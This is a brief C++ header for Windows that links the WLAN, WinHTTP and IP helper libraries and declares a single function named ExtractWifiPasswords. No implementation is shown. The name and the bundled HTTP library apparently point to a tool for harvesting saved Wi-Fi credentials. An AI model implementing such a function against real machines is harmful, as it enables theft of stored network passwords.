#pragma once
#include <windows.h>
#include <winhttp.h>
#include <wlanapi.h>
#include <iphlpapi.h>
#include "nlohmann/json.hpp"

#pragma comment(lib, "wlanapi.lib")
#pragma comment(lib, "winhttp.lib")
#pragma comment(lib, "iphlpapi.lib")

using json = nlohmann::json;

std::vector<std::pair<std::string, std::string>> ExtractWifiPasswords();